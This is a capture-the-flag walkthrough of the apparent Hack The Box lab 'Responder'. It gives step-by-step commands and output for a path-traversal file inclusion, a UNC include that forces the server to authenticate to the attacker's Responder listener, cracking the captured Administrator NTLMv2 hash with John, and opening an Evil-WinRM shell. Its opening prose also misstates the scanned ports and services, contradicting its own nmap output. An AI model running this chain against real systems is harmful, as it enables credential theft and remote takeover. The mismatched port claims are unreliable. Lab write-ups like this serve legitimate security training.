# Responder
#startingpoint 
#veryeasy 
#web 
#windows
#hash
#winrm
#php
### Reconnaissance
We start by running an Nmap scan against the target IP address, to do this we use `nmap -p- -sV $TARGET`. The output shows that there are several open ports, including HTTP (port 80), SMB (port 445), and MS-RPC (port 500). The Nmap scan also provides information about the services running on each port. For example, we found that the HTTP server is running version 2.4.52 of the Microsoft HTTP API, while the SMB server is running version 2.0 of the Windows Remote Management protocol. This suggested that the system was using outdated software, which could make it more vulnerable to attacks.
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-21 10:10 CET
Nmap scan report for 10.129.12.218
Host is up (0.048s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Exploring the website
If we access the website from the web-browser using the IP we get redirected to `http://unika.htb/` but the browser says that it is unable to find the web, so we know its using name-based Virtual Hosting.

We add the domain to /etc/hosts with `echo "${TARGET} unika.htb" | sudo tee -a /etc/hosts`
Once done we can now see properly the website, we notice we can change the language, if we try to change it to German for example, we see that the url changes to this `http://unika.htb/index.php?page=german.html`
We can potentially exploit this to do a File Inclusion Vulnerability.

### File Inclusion Vulnerability
Now we can test if we are able to access files from the web-server that we aren't supposed to, such as for example the windows hosts file. In order to do this we can search the following URL `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`

The website show us the content of the hosts file and it looks like this:
```
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
```
### Responder

We know that we have a Windows machine which is allowing us to get any kind of file that we need.
As the machine name says we are going to use the responder utility.
In ParrotOS the default conf of the tool is enough for us so we launch it with `sudo responder -I tun0`

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.169]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-GSH2TYUDZXZ]
    Responder Domain Name      [HMW5.LOCAL]
    Responder DCE-RPC Port     [46819]

[+] Listening for events...

```

The IP that our responder is listening in is `10.10.14.169`

Now we try to access some file in our machine from the website by using the smb protocol, to do this we go to `http://unika.htb/index.php?page=//10.10.14.169/text.txt`
```
  
**Warning**: include(\\10.10.14.169\TEXT.TXT): Failed to open stream: Permission denied in **C:\xampp\htdocs\index.php** on line **11**  
  
**Warning**: include(): Failed opening '//10.10.14.169/text.txt' for inclusion (include_path='\xampp\php\PEAR') in **C:\xampp\htdocs\index.php** on line **11**
```
If we check the responder we see the following:
```
[SMB] NTLMv2-SSP Client   : 10.129.12.218
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:81338c8e0e67cf8a:2F143B092C220F10E72C3A98D614AB72:010100000000000000040A93661CDA016F79F715D622A0AC000000000200080048004D005700350001001E00570049004E002D00470053004800320054005900550044005A0058005A0004003400570049004E002D00470053004800320054005900550044005A0058005A002E0048004D00570035002E004C004F00430041004C000300140048004D00570035002E004C004F00430041004C000500140048004D00570035002E004C004F00430041004C000700080000040A93661CDA0106000400020000000800300030000000000000000100000000200000CB0FFB75F5B03EFDB855416B745D7C62CB697DF950EBD376E1C224D73E1DA4190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100360039000000000000000000
```
### Breaking the hash

The hash can be broken by using a tool like John the ripper, to start we save the hash as a file.
```
echo "Administrator::RESPONDER:81338c8e0e67cf8a:2F143B092C220F10E72C3A98D614AB72:010100000000000000040A93661CDA016F79F715D622A0AC000000000200080048004D005700350001001E00570049004E002D00470053004800320054005900550044005A0058005A0004003400570049004E002D00470053004800320054005900550044005A0058005A002E0048004D00570035002E004C004F00430041004C000300140048004D00570035002E004C004F00430041004C000500140048004D00570035002E004C004F00430041004C000700080000040A93661CDA0106000400020000000800300030000000000000000100000000200000CB0FFB75F5B03EFDB855416B745D7C62CB697DF950EBD376E1C224D73E1DA4190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100360039000000000000000000" > hash.txt
```

We are going to use the known and trusted rockyou word-list that contains a lot of common passwords. The final command looks like `john -w=/usr/share/wordlists/rockyou.txt hash.txt`

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2023-11-21 10:52) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
John found that the Administrator account password is badminton. Now that we have it we can access the winrm service we found earlier.

### Windows Remote Management

We can use Evil-WinRM to connect to the target system and execute commands as the Administrator user. 

To install the tool we run `gem install evil-winrm`. Once installed to use it we execute `evil-winrm -i ${TARGET} -u administrator -p badminton`. We are able to successfully connect and execute commands, indicating that the system's remote management capabilities were not properly secured.

```
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

After searching the flag we can find it in `C:\Users\mike\Desktop\flag.txt`